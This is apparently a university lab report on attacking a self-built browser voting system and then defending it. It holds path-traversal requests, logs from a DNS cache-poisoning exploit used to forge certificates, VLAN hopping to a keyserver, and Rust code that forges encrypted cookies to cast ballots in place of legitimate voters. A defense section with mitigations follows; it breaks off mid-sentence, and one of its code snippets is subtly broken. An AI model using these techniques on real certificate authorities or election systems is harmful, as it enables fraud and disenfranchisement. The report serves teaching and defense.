# Compromising a Browser-Based Voting System

Nate Sales and Jake Ellington

Worcester Polytechnic Institute

## Infrastructure
The infrastructure consists of three primary servers and an attacker. The first server, known as `api.internal`, hosts the web interface for voting, the voter database, the ballot database, and a vote tallying function. The second server, `dns.internal`, provides a DNS resolver. The Third server, `ca.internal`, serves as a certificate authority for TLS communications and hosts a keystore for the `api` server. 


### Web Voting Server
The first virtual machine, `api.internal`, handles all web traffic, user authentication and authorization, and a database of cast votes. This is all done by a single binary written in Rust and using the Rocket API. 

The voting system must meet three primary security goals that are in opposition to each other: the voter must be authorized to vote, they must vote only once, and the content of the vote must not be linked to the voter. The web server addresses this by first requiring users to enter a social security number and password. This data is sent to a form handler which salts and hashes the password with industry-standard argon2 and compares it to a hash in a sqlite database. If these hashes match,(confidentiality) the server picks an identifier number and adds it to a list of authorized numbers in memory. It then sets the user’s password hash in the database to 0, a value which will never be output by the argon2 hashing algorithm, thus preventing more than one login per user. The server then creates, signs, and encrypts this value in a cookie with AES-256-GCM and sends it to the client. Refer to Appendix A figure 1.

 The client is redirected to a ballot and when this form is processed the server retrieves, decrypts, and checks the client’s cookie against the authorized list. If the contents match, the vote is recorded in the database, the identifier is removed from the authorized list, and the cookie is removed from the client. The identifier value in the cookie and the recorded vote are never associated with the identity of the user. Refer to Appendix A figure 2.

 Notable elements of the server's configuration file `Rocket.toml` includes lines 11-18 which read
 ```toml
 secret_key = "REPLACE ME"

[release.tls]
certs = "/etc/vote/ca-cert.pem"
key = "/etc/vote/ca-key.pem"

[default.databases.Vote]
url = "/etc/vote/vote.db"
 ```

 All votes and voter account records are stored in the sqlite database `/etc/vote/vote.db`, and all web traffic uses TLS with a certificate issued by the local certificate authority and HSTS enabled, making a https->http downgrade attack impossible. The `secret_key` field is a base64 encryption key used by Rocket when it encrypts and signs the authorization token cookies. This is automatically replaced by a value retrieved from the key server over MTLS every time the webserver starts by the use of a systemd service file. 
```systemd
[Service]
WorkingDirectory=/etc/vote
ExecStartPre=/etc/vote/client -ca-cert ca-crt.pem -client-cert api.internal-crt.pem -client-key api.internal-key.pem -url https://keyserver.internal
ExecStart=/etc/vote/voter-api
Restart=on-failure
```
The `client` program called by systemd is a small program that establishes an MTLS handshake with the internal keyserver, retrieves the latest key, and writes it to Rocket's configuraiton file. 
 
### DNS Server

The DNS server simply serves to answer authoritatively for the `.internal` top level domain. We chose the `unbound` DNS resolver package - a notable departure from an industry standard authoritative DNS server like BIND, NSD, or Knot. Unbound is premierely a recursive resolver, but supports serving static local zones authoritatively and uses a single simple configuration file.

Update `apt` cache and install `unbound` package:

```bash
dns:~$ sudo apt update
dns:~$ sudo apt install -y unbound
```

Replace the `/etc/unbound/unbound.conf` config file:

```yaml
server:
  do-ip4: yes
  do-ip6: yes
  do-udp: yes

  directory: "/etc/unbound"
  interface: 0.0.0.0@53
  access-control: 0.0.0.0/0 allow
  verbosity: 3

  local-zone: "internal." static
    local-data: "api.internal IN A 10.64.10.1"
    local-data: "dns.internal IN A 10.64.10.2"
    local-data: "ca.internal IN A 10.64.10.3"
    local-data: "keyserver.internal IN A 172.16.10.1"
    local-data: "attacker.internal IN A 10.64.10.4"
    local-data: "_acme-challenge.admin.internal. IN TXT real-acme-response"

  local-zone: "10.16.172.in-addr.arpa." static
    local-data: "1.10.16.172.in-addr.arpa. IN PTR keyserver.internal."
    local-data: "2.10.16.172.in-addr.arpa. IN PTR api.internal."
```

Disable system resolver (which conflicts with the unbound listener on port 53), start and enable unbound start at boot:

```bash
dns:~$ sudo systemctl disable --now systemd-resolved
Removed /etc/systemd/system/dbus-org.freedesktop.resolve1.service.
Removed /etc/systemd/system/multi-user.target.wants/systemd-resolved.service.
dns:~$ sudo systemctl enable --now unbound
Synchronizing state of unbound.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable unbound
```

Next, we configure each VM to use the DNS server as it's resolver by overriding the DHCP behavior to ignore DNS and set a static list of resolver IPs in `/etc/netplan/00-installer-config.yaml`

```yaml
network:
  version: 2
  ethernets:
    ens3:
      dhcp4: true
      dhcp4-overrides:
        use-dns: no
      nameservers:
        addresses: [10.64.10.2]
```

### Configure Certificate Authority

The certificate authority runs a custom ACME protocol implementation that we developed in Go. First, we create a systemd unit file to govern program lifecycle, stored in `/etc/systemd/system/ca.service:`

```
[Unit]
Description=Certification Authority
After=network.target

[Service]
User=student
Group=student
ExecStart=/home/student/ca -listen 10.64.10.3:443
WorkingDirectory=/home/student/
AmbientCapabilities=CAP_NET_BIND_SERVICE
KillMode=process
Restart=on-failure
Type=simple

[Install]
WantedBy=multi-user.target
```

The program can be compiled and built with `make -B ca` after cloning `https://github.com/cs4404-mission1/ca`.

```bash
mission1/ca(main) $ make -B ca
cd ca && CGO_LDFLAGS="-Xlinker -static" go build -o ca
# github.com/cs4404-mission1/ca
/usr/bin/ld: /tmp/go-link-1725924403/000004.o: in function `_cgo_2ac87069779a_C2func_getaddrinfo':
/tmp/go-build/cgo-gcc-prolog:58: warning: Using 'getaddrinfo' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
scp -i ~/.ssh/keys/wpi -P 8236 ca/ca student@secnet-gateway.cs.wpi.edu:~/
ca                                                      100%   11MB   8.5MB/s   00:01    
ssh -p 8236 -i ~/.ssh/keys/wpi student@secnet-gateway.cs.wpi.edu sudo systemctl restart ca
scp -i ~/.ssh/keys/wpi -P 8236 ca/main.go student@secnet-gateway.cs.wpi.edu:~/
main.go                                                 100% 4369   688.2KB/s   00:00    
scp -i ~/.ssh/keys/wpi -P 8236 ca/crypto.go student@secnet-gateway.cs.wpi.edu:~/
crypto.go                                               100% 3255   458.1KB/s   00:00    
scp -i ~/.ssh/keys/wpi -P 8236 ca/challenge.go student@secnet-gateway.cs.wpi.edu:~/
challenge.go                                            100% 1374   256.1KB/s   00:00    
```

The Makefile automatically builds a static binary called `ca` and copies it to the API VM along with program's source code. Finally, we reload systemd and start and enable the CA service:

```bash
ca:~$ sudo systemctl daemon-reload
ca:~$ sudo systemctl enable --now ca
```

Upon first execution, the CA generates it's root key and certificate, as well as a signed certificate for `ca.internal` and `keyserver.internal`. The root certificate will be saved as `ca-crt.pem` on the CA, and must be copied to the rest of the VMs to add to their trust store:

```bash
sudo cp ca-crt.pem /etc/ssl/certs/DigiShue_Root_CA.pem
sudo update-ca-certificates --fresh
```

### Setup key server VLAN

For security, the key server and API communicate on an isolated VLAN. We create a VLAN on the CA and API to facilitate this communication, and add an IP address to each:

CA:

```bash
ca:~$ sudo ip link add link ens3 name ens3.10 type vlan id 10
ca:~$ sudo ip addr add dev ens3.10 172.16.10.1/24
ca:~$ sudo ip link set dev ens3.10 up
```

API:

```bash
api:~$ sudo ip link add link ens3 name ens3.10 type vlan id 10
api:~$ sudo ip addr add dev ens3.10 172.16.10.2/24
api:~$ sudo ip link set dev ens3.10 up
```

### Deploy key server

The key server runs on the same VM as the CA, but binds to a different address (`172.16.10.1`) and has a different hostname (`keyserver.internal`). We first create a systemd unit file for the key server in `/etc/systemd/system/keyserv.service`:

```
[Unit]
Description=Key Server
After=network.target

[Service]
User=student
Group=student
ExecStart=/home/student/keysrv
WorkingDirectory=/home/student/
AmbientCapabilities=CAP_NET_BIND_SERVICE
KillMode=process
Restart=on-failure
Type=simple

[Install]
WantedBy=multi-user.target
```

We then run `sudo systemctl daemon-reload` to sync the changes to systemd.

Cloning the key server repo with `git clone https://github.com/cs4404-mission1/keyserver` and running `make` within the directory will build, deploy, and restart the key server:

```bash
mission1/keyserver(main) $ make
CGO_LDFLAGS="-Xlinker -static" go build -o keysrv keysrv.go
# command-line-arguments
/usr/bin/ld: /tmp/go-link-2985185640/000004.o: in function `_cgo_2ac87069779a_C2func_getaddrinfo':
/tmp/go-build/cgo-gcc-prolog:58: warning: Using 'getaddrinfo' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
ssh -i ~/.ssh/keys/wpi -p 8236 student@secnet-gateway.cs.wpi.edu sudo systemctl stop keysrv
scp -i ~/.ssh/keys/wpi -P 8236 keysrv student@secnet-gateway.cs.wpi.edu:~/
keysrv                                                  100% 7546KB   5.9MB/s   00:01    
ssh -i ~/.ssh/keys/wpi -p 8236 student@secnet-gateway.cs.wpi.edu sudo systemctl start keysrv
```

## Reconnaissance

We begin our reconnaissance phase by enumerating DNS records for the `internal` TLD. We wrote a simple utility to iterate over a wordlist and attempt an `A` query for each possible subdomain.

```bash
#!/bin/bash
# dnscan.sh
# Usage: ./dnscan.sh <domain> <wordlist>

# Check for 2 args
if [ $# -ne 2 ]; then
  echo "Usage: $0 <domain> <wordlist>"
  exit 1
fi

# For line in file
while read -r line; do
  {
    resp=$(dig +short "$line.$1")
    if [ -n "$resp" ]; then
      echo "$line.$1 -> $resp"
    fi
  } &
done <$2
wait
```

We run `dnscan.sh` to begin subdomain enumeration for the `internal` TLD, providing a list of the [top 10,000 common subdomains](https://github.com/rbsec/dnscan).

```bash
pwn:~$ ./dnscan.sh internal subdomains-10000.txt 
api.internal -> 10.64.10.1
dns.internal -> 10.64.10.2
ca.internal -> 10.64.10.3
keyserver.internal -> 172.16.10.1
```

We see a few hosts within our local 10.64.10.x network, and `keyserver.internal` in another network. [V-NET-01]

Beginning with the CA, we scan for open ports with a TCP SYN scan:

```bash
pwn:~$ sudo nmap -sS ca.internal
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-07 23:20 UTC
Nmap scan report for ca.internal (10.64.10.3)
Host is up (0.00011s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https
MAC Address: 52:54:00:00:05:38 (QEMU virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
```

The scan turns up port 22 running SSH, and 443 running an HTTPS webserver. We focus on the webserver for this attack.

Examining the headers returned from a GET request yields a hint towards what software the server is running:

```bash
pwn:~$ curl -I https://ca.internal
HTTP/1.1 404 Not Found
Server: digishue-go
Date: Tue, 08 Nov 2022 03:34:43 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 13
```

The `Server` header indicates the server is running `digishue-go`, likely a CA implementation for DigiShue in the Go programming language.

### Enumerating the CA webserver

We can use the `wfuzz` tool to enumerate common webserver directories. We supply a wordlist of common webserver directories and ignore 404 status codes for files or directories that are not found. The `FUZZ` keyword specifies where in the URL to fuzz with the contents of the wordlist.

```bash
pwn:~$ wfuzz -w directory-list-2.3-small.txt --hc 404 https://ca.internal/FUZZ
<truncated>
ID           Response   Lines    Word     Chars       Payload
000000269:   200        47 L     111 W    1110 Ch     "static" 
000001430:   405        0 L      3 W      18 Ch       "request"
000011792:   405        0 L      3 W      18 Ch       "validate"
<truncated>
```

The `static` endpoint returns far more bytes, so we begin here. Requesting this URL returns a YAML file:

```bash
pwn:~$ curl https://ca.internal/static
openapi: 3.0.1
info:
  title: DigiShue Certificate Authority
  version: 1.0.0
servers:
- url: https://ca.internal
paths:
  /request:
    post:
      summary: Request a certificate for a given domain
      parameters:
        - in: query
          name: domain
          required: true
          schema:
            type: string
          description: The domain to request a certificate for
      responses:
        '200':
          description: TXT challenge string

  /validate:
    post:
      summary: Validate a domain's DNS challenge and issue a certificate 
      parameters:
        - in: query
          name: domain
          required: true
          schema:
            type: string
          description: Domain to validate
      responses:
        '200':
          description: PEM encoded certificate and private key

  /static:
    post:
      summary: Retrieve a static asset
      parameters:
        - in: query
          name: path
          schema:
            type: string
          description: Static asset to retrieve
      responses:
        '200':
          description: Static asset
```

This appears to be an OpenAPI specification manifest; a standard for describing REST APIs. The CA likely uses this manifest to aid developers in integrating with their service. The manifest defines the API endpoints and parameters available to interact with the CA.

The `/static` endpoint contains the optional query parameter `path` that describes the static asset that the user wants to retrieved. Providing a test string returns a 500 error code and a rich error message indicating that the file cannot be found.

```bash
pwn:~$ curl -i https://ca.internal/static?path=test
HTTP/1.1 500 Internal Server Error
Server: digishue-go
Date: Tue, 08 Nov 2022 03:45:06 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 43

open static/test: no such file or directory
```

The server appears to substitute the path value into a filename. Modifying our query value with a URL encoded representation of `../`  path traversal causes a far more interesting error:

```bash
pwn:~$ curl -i https://ca.internal/static?path=..%2f
HTTP/1.1 500 Internal Server Error
Server: digishue-go
Date: Tue, 08 Nov 2022 03:45:31 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 31

read static/../: is a directory
```

Instead of failing to access a nonexistent file, path traversal resets the path one parent level above `static`, therefore instructing the server to read a directory as a file. This throws a `is a directory` error, indicating the server may be vulnerable to path traversal.

### CA Vulnerability 1: Local file inclusion via directory traversal in /static path parameter [V-CA-01]

Combining our prior knowledge that the server may be running Go with a path traversal exploit, we continue API enumeration by fuzzing for Go source code files. We invoke `wfuzz` and supply the `--hc 500` flag to ignore server error 500s.

```bash
pwn:~$ wfuzz -w directory-list-2.3-small.txt --hc 500 https://ca.internal/static?path=../FUZZ.go
ID           Response   Lines    Word     Chars       Payload                       
000000077:   200        167 L    421 W    3720 Ch     "main"
000000624:   200        123 L    351 W    2955 Ch     "crypto"
000004213:   200        67 L     186 W    1385 Ch     "challenge"
```

We have 3 valid HTTP 200 OK responses, so we manually substitute the filenames to download each file:

```bash
curl -so main.go http://10.64.10.3:8080/static?path=../main.go
curl -so crypto.go http://10.64.10.3:8080/static?path=../crypto.go
curl -so challenge.go http://10.64.10.3:8080/static?path=../challenge.go
```

Viewing the files reveals that we've successfully exfiltrated the source code for the certificate authority.

## Source Code Examination

The `/validate` handler is defined in `main.go`, and aligns with the expected functionality documented by the OpenAPI spec that we retrieved earlier. It reads a domain as a URL parameter and attempts to validate domain ownership via a DNS challenge.

```go
app.Post("/validate", func(c *fiber.Ctx) error {
	// Retrieve domain parameter
	domain := c.Query("domain")
	if domain == "" {
		return c.Status(400).SendString("missing domain parameter")
	}

	// Query DNS for challenge string
	challenge, err := dnsChallenge(domain)
	if err != nil {
		return c.Status(500).SendString(err.Error())
	}

	// Compare challenge string
	if challenge != pendingValidations[domain] {
		return c.Status(400).SendString("invalid challenge")
	}

	<truncated>
})
```

The `dnsChallenge` function is defined in `challenge.go` and contains `_acme-challenge` - a recognizable string from the ACME protocol. The Automatic Certificate Management Environment (commonly referred to as the ACME protocol) is a standard to securely and validate domain ownership and issue certificates in an automated manner. `dnsChallenge` appears to implement the `dns-01` challenge as defined in  [RFC 8555 section 8.4](https://www.rfc-editor.org/rfc/rfc8555.html#section-8.4). The function makes a TXT query for `"_acme-challenge." + domain` and returns the challenge value back to the `/validate` handler.

The function creates a DNS message and sends it to a resolver:

```go
m := new(dns.Msg)
m.Id = uint16(rand.Intn(65535))
m.RecursionDesired = true
m.Question = []dns.Question{{
    Name:   dns.Fqdn("_acme-challenge." + domain),
    Qtype:  dns.TypeTXT,
    Qclass: dns.ClassINET,
}}

conn, err := net.DialUDP(
    "udp",
    &net.UDPAddr{IP: local, Port: 50000},
    &net.UDPAddr{IP: remote, Port: 53},
)
if err != nil {
    return "", err
}
defer conn.Close()

client := dns.Client{Net: "udp"}
r, _, err := client.ExchangeWithConn(m, &dns.Conn{Conn: conn})
if err != nil {
    return "", err
}
```

There are two critical flaws in this implementation. The outgoing DNS message is sent with a hardcoded UDP source port, and the message ID is randomized with a deterministic pseudorandom number generator (PRNG), reducing entropy low enough to enable DNS answer forgery through response poisoning.

### CA Vulnerability 2: DNS challenge uses a constant UDP source port [V-CA-02]

*RFC 5452 Measures for Making DNS More Resilient against Forged Answers* recommends using random UDP source port numbers due to low entropy concerns:

> This document recommends the use of UDP source port number
> randomization to extend the effective DNS transaction ID beyond the
> available 16 bits. [RFC 5452 section 10](https://www.rfc-editor.org/rfc/rfc5452#section-10)

Knowing the source port is always 50000, the available entropy is now limited to the DNS message ID field (a 16-bit identifier). RFC 5452 notes that some implementations only use 14 bits, further reducing entropy required to forge a response.

> The DNS ID field is 16 bits wide, meaning that if full use is made of
> all these bits, and if their contents are truly random, it will
> require on average 32768 attempts to guess. Anecdotal evidence
> suggests there are implementations utilizing only 14 bits, meaning on
> average 8192 attempts will suffice. [RFC 5452 section 4.3](https://www.rfc-editor.org/rfc/rfc5452#section-4.3)

### CA Vulnerability 3: Deterministic PRNG and constant seed for generating DNS message ID in DNS challenge [V-CA-03]

The `dnsChallenge` function sets the outgoing message ID with `uint16(rand.Intn(65535))` from the `math/rand` package. This is dangerous because `math/rand` is deterministic. The Go documentation for `math/rand` warns against using the package for secure operations:

> This package's outputs might be easily predictable regardless of how it's seeded. For random numbers suitable for security-sensitive work, see the crypto/rand package. [pkg.go.dev math/rand](https://pkg.go.dev/math/rand)

Furthermore, the PRNG is never manually seeded. The random source uses "precooked" values generated by [gen_cooked.go from math/rand](https://cs.opensource.google/go/go/+/refs/tags/go1.19.3:src/math/rand/gen_cooked.go), so with a default seed, all numbers are trivially and repeatably predictable. The n'th `rand.Intn(65535)` call will return the same value regardless of the value of n or the host system. It is not as simple as calling `rand.Intn(65535)` to exploit this vulnerability however.

The CA uses the `randHex` function defined in `challenge.go` to generate an random string used to validate domain ownership.

```go
func randHex() string {
   const letters = "0123456789abcdef"
   b := make([]byte, 32)
   for i := range b {
      b[i] = letters[rand.Intn(len(letters))]
   }
   return string(b)
}
```

This function calls `rand.Intn` in a loop over a 32 byte slice, so we need to drain 32 integers from the exploit host's PRNG before attempting to forge a response to the CA.

## Attack
### Developing a chained exploit path

We have identified three vulnerabilities in the DigiShue Certificate Authority API:


V-CA-01: Local file inclusion via directory traversal in /static path parameter

V-CA-02: DNS challenge uses a constant UDP source port

V-CA-03: Deterministic PRNG and constant seed for generating DNS message ID in DNS challenge

We combined V-CA-02 and V-CA-03 in an exploit to fraudulently obtain a certificate for any domain; in this case `admin.internal`.

```bash
pwn:~$ sudo ./exploit -d admin.internal
2022/11/08 05:39:50 Preparing DNS poisoner
2022/11/08 05:39:50 Creating pwn0 interface with 10.64.10.2
2022/11/08 05:39:50 Fetching validation token
2022/11/08 05:39:50 Draining RNG entropy pool
2022/11/08 05:39:50 Serialized DNS response for TXT [1f7b169c846f218ab552fa82fbf86758] id 11807
2022/11/08 05:39:50 Sending DNS responses to 10.64.10.3:50000
2022/11/08 05:39:50 Waiting for DNS cache poisoning
2022/11/08 05:39:51 Validating token with CA
2022/11/08 05:39:57 Wrote admin.internal-crt.pem and admin.internal-key.pem
2022/11/08 05:39:57 Stopped DNS poisoner
```

The exploit program takes less than 10 seconds to run and is entirely automated. The program works as follows:

1. Request validation token from CA
2. Drain entropy pool and predict next DNS message ID
3. Serialize and create a DNS packet with predicted message ID
4. Flood DNS packet to poison the CA's DNS cache
5. Request certificate validation and retrieve issued certificate
6. Write cert and key to disk for later use

We can validate that the certificate is signed by the CA:

```
pwn:~$ openssl verify -CAfile DigiShue_CA.pem admin.internal-crt.pem
admin.internal-crt.pem: OK
```

At this point we now have fraudulently obtained a valid certificate and corresponding private key for `admin.internal`.

### Compromise key server network and extract cookie encryption key

We now turn our focus to the host `keyserver.internal`, discovered by DNS subdomain enumeration during reconnaissance.

Attempting a route lookup for `172.16.10.1` reveals that the host is unreachable from our network:

```
pwn:~$ ip route show 172.16.10.1
```

We continue by running a packet capture with VLAN decoding enabled to look for any traffic visible to our attacker machine:

```bash
pwn:~$ sudo tcpdump -i ens3 -n -e vlan
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens3, link-type EN10MB (Ethernet), capture size 262144 bytes
14:25:35.396015 52:54:00:00:05:36 > 33:33:00:00:00:02, ethertype 802.1Q (0x8100), length 74: vlan 10, p 0, ethertype IPv6, fe80::5054:ff:fe00:536 > ff02::2: ICMP6, router solicitation, length 16
```

After a few minutes, a 802.1Q frame appears on the wire, tagged with VLAN 10. This aligns with the common network practice of encoding a VLAN tag into the third octet of an IPv4 address; notably the 10 in `172.16.10.1`.

### Network Vulnerability 1: Unprotected trunk ports [V-NET-02]

Next, we create an interface to hop into VLAN 10:

```bash
pwn:~$ sudo ip link add link ens3 name ens3.10 type vlan id 10
pwn:~$ sudo ip addr  add dev ens3.10 172.16.10.200/24
pwn:~$ sudo ip link set dev ens3.10 up
```

The key server is now reachable:

```bash
pwn:~$ ping -c 1 keyserver.internal
PING keyserver.internal (172.16.10.1) 56(84) bytes of data.
64 bytes from 172.16.10.1 (172.16.10.1): icmp_seq=1 ttl=64 time=0.820 ms

--- keyserver.internal ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.820/0.820/0.820/0.000 ms
```

We continue enumerating the network by querying the 172.16.10.0/24 network for PTR records:

```bash
#!/bin/bash
# ptrecon.sh

for i in {0..255}; do
  {
    resp=$(dig +short -x "172.16.10.$i")
    if [ -n "$resp" ]; then
      echo "172.16.10.$i -> $resp"
    fi
  } &
done
wait
```

Running the `ptrecon.sh` script discovers a PTR record pointing `172.16.10.2` to `api.internal`:

```bash
pwn:~$ ./ptrecon.sh
172.16.10.1 -> keyserver.internal.
172.16.10.2 -> api.internal.
```

By this point it appears this network is intended for the API and key server to communicate directly.

Attempting to connect to the server throws a `bad certificate` error, likely meaning the client failed to provide a valid TLS certificate for mutual TLS authentication.

```bash
pwn:~$ curl https://keyserver.internal
curl: (56) OpenSSL SSL_read: error:14094412:SSL routines:ssl3_read_bytes:sslv3 alert bad certificate, errno 0
```

Using our combined V-CA-02 and V-CA-03 exploit, we're able to generate a certificate to impersonate the API and retry a request to the key server, this time authenticated as `api.internal`, yielding a successful HTTP query.

```bash
pwn:~$ sudo ./exploit -d api.internal
2022/11/08 19:15:57 Preparing DNS poisoner
2022/11/08 19:15:57 Creating pwn0 interface with 10.64.10.2
2022/11/08 19:15:57 Fetching validation token
2022/11/08 19:15:57 Serializing DNS packet
2022/11/08 19:15:57 Serialized DNS response for TXT [1f7b169c846f218ab552fa82fbf86758] id 11807
2022/11/08 19:15:57 Sending DNS responses to 10.64.10.3:50000
2022/11/08 19:15:57 Waiting for DNS cache poisoning
sud2022/11/08 19:15:58 Validating token with CA
2022/11/08 19:16:02 Wrote api.internal-crt.pem and api.internal-key.pem
2022/11/08 19:16:02 Stopped DNS poisoner
pwn:~$ curl https://keyserver.internal --key api.internal-key.pem --cert api.internal-crt.pem 
dce1360e4bc9a3a929a9dd5115e7977faac1f514febcf18fc036eebe3dffbc02
pwn:~$ curl https://keyserver.internal --key api.internal-key.pem --cert api.internal-crt.pem 
dce1360e4bc9a3a929a9dd5115e7977faac1f514febcf18fc036eebe3dffbc02
pwn:~$ curl https://keyserver.internal --key api.internal-key.pem --cert api.internal-crt.pem 
dce1360e4bc9a3a929a9dd5115e7977faac1f514febcf18fc036eebe3dffbc02
```

Retrying the request a few times returns the same 64 character hex string. This appears to be a key used by the API for encryption.

### Cookie Capture and Decryption

The first step of surveiling the webserver was to perform a scan of the host to find any valueable information. To do this, we executed `nmap -v -A api.internal` whose output can be found in appendix B figure 1. Abridged output only including pertainant information follows:
```zsh
Nmap scan report for api.internal (10.64.10.1)
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
...
443/tcp open  ssl/https PWNED
| ssl-cert: Subject: organizationName=DigiShue CA
| Issuer: organizationName=DigiShue CA
...
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
...
|     <small>Rocket</small>
```
The server only has two ports open: SSH and HTTPS, and nmap cannot identify the http server. However, this still contains very useful information. One of `nmap`'s requests returned 404 and part of the 404 response was the word rocket. A simple web search of "rocket web server" returns information about the the Rust Rocket API. Now we know with what the webserver was built. 

The next step was to log in to the server using valid credentials and analize its communications. The server gives the user a cookie after successfully logging in, for example we recieved
```
votertoken:"DA%2FZytKeNZ+deMcdVhUo5TZM1j8YMI7arqOvwnc%3D"
```
which appears to be an encrypted value. 

Knowing that the server was built with the Rocket API and that it seems to be serving encrypted cookies, we then investigated if Rocket has a mechanism for encrypting cookies. In fact, it does. According to the Rocket guide (https://rocket.rs/v0.5-rc/guide/requests/#private-cookies):
> For sensitive data, Rocket provides private cookies. Private cookies are similar to regular cookies except that they are encrypted using authenticated encryption, a form of encryption which simultaneously provides confidentiality, integrity, and authenticity. Thus, private cookies cannot be inspected, tampered with, or manufactured by clients.

Can't be manufactured by clients, eh? We'll see about that. Further in the same section, the guide states 
>To encrypt private cookies, Rocket uses the 256-bit key specified in the secret_key configuration parameter. [...] The value of the parameter may either be a 256-bit base64 or hex string or a 32-byte slice.

This description exactly matches the key recovered from the keyserver in the previous step. Looking through the rocket source code, it impliments the library cookie-rs (https://github.com/SergioBenitez/cookie-rs) for cookie handling, which in turn has a private-cookie functionality which impliments AES-GCM. Using Cookie-rs's cryptography code as a base and the known secret key, we were able to successfully decrypt and re-ecrypt the cookie from the api server. A portion of the decryption source code follows:
```rust
// Credit: cookie-rs by Sergio Benitez
    let data = base64::decode(cstring).map_err(|_| "bad base64 value")?;
    if data.len() <= NONCE_LEN {
        return Err("length of decoded data is <= NONCE_LEN");
    }

    let (nonce, cipher) = data.split_at(NONCE_LEN);
    let payload = Payload { msg: cipher, aad: name.as_bytes() };

    let aead = Aes256Gcm::new(GenericArray::from_slice(key.encryption().try_into().unwrap()));
    aead.decrypt(GenericArray::from_slice(nonce), payload)
        .map_err(|_| "invalid key/nonce/value: bad seal")
        .and_then(|s| String::from_utf8(s).map_err(|_| "bad unsealed utf8"))
```
*source: https://github.com/SergioBenitez/cookie-rs/blob/master/src/secure/private.rs*

The decrypted value from this operation is the string representaiton of an integer, in this case `"10"`, presumably a value that is incrimented for each user as they log on. By incrimenting this value ourselves and generating and encrypting a new cookie with this new value, we will have the authorization token of the next person who logs in to vote.

### Cookie Monster
To exploit this, we wrote the rust program Cookie Monster, which carries out this section of the attack automatically. It first logs in to the web server with valid credentials to fetch a cookie, then it vote as normal using this cookie. Cookie Monster then decrypts the contents of the cookie using a secret key passed via the command line, extracts its sequence number, incriments it, and creates a new cookie with this new sequence number. This cookie is signed, encrypted, and used to register another vote. 

Registering another vote may not immediatley work as the forged cookie needs a valid user to log in to make its sequence number valid. Cookie Monster will keep re-trying voting with a cookie until the vote is accepted, then it makes a new incrimented cookie and repeates the process. By doing this, we are depriving all voters who attempt to cast ballots after Cookie Monster is started of their vote and using their credentials to cast our own ballots. This process will repeat until a keyboard interrupt is given. A snippet of this code follows: 
```rust
loop{
  // send a new vote with our forged cookie
  let fakevote = client.post("https://api.internal:443/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
  {
    let mut store = jar.lock().unwrap();
    // check if vote worked
    if fakevote.text().await.unwrap().contains("Thanks for voting"){
        println!("Voted for gus with sequence number {}",&sequence_num);
        store.clear();
        sequence_num += 1;}
        let newcookie = Cookie::new("votertoken",encrypt_cookie("votertoken", &sequence_num.to_string(),&secret));
        // webserver will have removed our cookie regardless of auth success so we need to put it back
        store.insert_raw(&newcookie, &Url::parse("https://api.internal").unwrap()).unwrap();
  }
}
```
### Auto Vote
Autovote is a python script which combines all of the previous exploits into one fully automated executable. It registers a virtual interface on VLAN 10 by calling the `ip` command, runs the `exploit` go executable, retrieves the secret key via the requests library, and launces cookie monster with said key. An example of its output can be found in Appendix B figure 3.

## Defense

### Overview

We discovered 5 vulnerabilities in the ShueWorld election system:

**V-CA-01**: Local file inclusion via directory traversal in /static path parameter

**V-CA-02**: DNS challenge uses a constant UDP source port

**V-CA-03**: Deterministic PRNG and constant seed for generating DNS message ID in DNS challenge

**V-NET-01**: Sensitive information disclosure via DNS

**V-NET-02**: Unprotected VLAN trunk ports


### Mitigating V-CA-01: Local file inclusion via directory traversal in /static path parameter

The `/static` endpoint accepts a `path` parameter to retrieve static assets. It doesn't correctly sanitize input which allows an attacker to traverse the filesystem with a `..%2f` or `../` character sequence. We suggest using the [path/filepath](https://pkg.go.dev/path/filepath) module from the standard library to sanitize and verify the path against path and symlink traversal before sending the file to the client.

```go
func sanitizePath(path string) (string, error) {
  path := filepath.Clean(path)
  r, err := filepath.EvalSymlinks(path)
  if err != nil {
     return c, errors.New("invalid path specified")
  }
  return r, nil
}
```

### Mitigating V-CA-02: DNS challenge uses a constant UDP source port

The `dnsChallenge` function uses a hardcoded outbound UDP port of 50000. This reduces entropy required to forge DNS answers towards the CA. We propose modifying the `dnsChallenge` function to allow the system to choose a random, ephemeral port number for each DNS query:

```go
- conn, err := net.DialUDP(
- 	"udp",
- 	&net.UDPAddr{IP: local, Port: 50000},
- 	&net.UDPAddr{IP: remote, Port: 53},
- )
- if err != nil {
- 	return "", err
- }
- defer conn.Close()
- 
client := dns.Client{Net: "udp"}
- r, _, err := client.ExchangeWithConn(m, &dns.Conn{Conn: conn})
+ r, _, err := client.Exchange(m, remote.String()+":53")
if err != nil {
	return "", err
}
```

### Mitigating V-CA-03: Deterministic PRNG and constant seed for generating DNS message ID in DNS challenge

The `dnsChallenge` and `randHex` functions use the Go standard library `math/rand` module.  `math/rand` is deterministic, meaning given a known seed, the output is repeatably predictable. Furthermore, the PRNG is never manually seeded. The random source uses "precooked" values generated by [gen_cooked.go from math/rand](https://cs.opensource.google/go/go/+/refs/tags/go1.19.3:src/math/rand/gen_cooked.go), so with a default seed, all numbers are trivially and repeatably predictable.

> This package's outputs might be easily predictable regardless of how it's seeded. For random numbers suitable for security-sensitive work, see the crypto/rand package. [pkg.go.dev math/rand](https://pkg.go.dev/math/rand)

RFC 5452 advises the use of a high quality cryptographically secure pseudo random number generator (CSPRNG) to mitigate this vulnerability.

> Proper unpredictability can be achieved by employing a high quality
